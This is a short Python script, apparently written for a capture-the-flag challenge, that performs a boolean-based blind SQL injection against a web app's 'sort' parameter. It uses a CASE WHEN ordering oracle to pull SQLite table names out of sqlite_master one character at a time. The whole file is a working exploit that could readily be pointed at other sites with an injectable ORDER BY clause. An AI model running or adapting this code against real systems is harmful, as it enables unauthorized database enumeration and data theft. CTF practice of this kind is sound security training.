import requests
import string
from bs4 import BeautifulSoup

def oracle(payload):

    url = "http://top-lang.c.ctf-snyk.io/"
    sort_param = f"(CASE WHEN {payload} THEN rating ELSE change END)"
    params = {"sort": sort_param}
    r = requests.get(url, params=params)
    soup = BeautifulSoup(r.text, 'html.parser')

    return (soup.find_all("td")[2].get_text() == "Go")

#print(oracle("1=1")) # should be GO
#print(oracle("1=0")) # should be C

# SQL Statement we want to deal with:
#test= "(select (SELECT SUBSTR(tbl_name,1,1) FROM sqlite_master WHERE type='table' LIMIT 1)='A')"

#print(oracle(test))

tables = ""
curr_iter = 1
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + ";"

not_ended = True


while not_ended:
    for c in charset:
        tmp_table = tables + c
        payload = f"(SELECT (SELECT SUBSTR(GROUP_CONCAT(tbl_name, ';'),1,{curr_iter}) FROM sqlite_master WHERE type='table')='{tmp_table}')"
        if oracle(payload):
            curr_iter += 1
            tables = tmp_table
            print(f"table name enumerated so far: {tables}")
            break
        if c == charset[-1]:
            print("End of enumeration")
            not_ended = False
            break

       
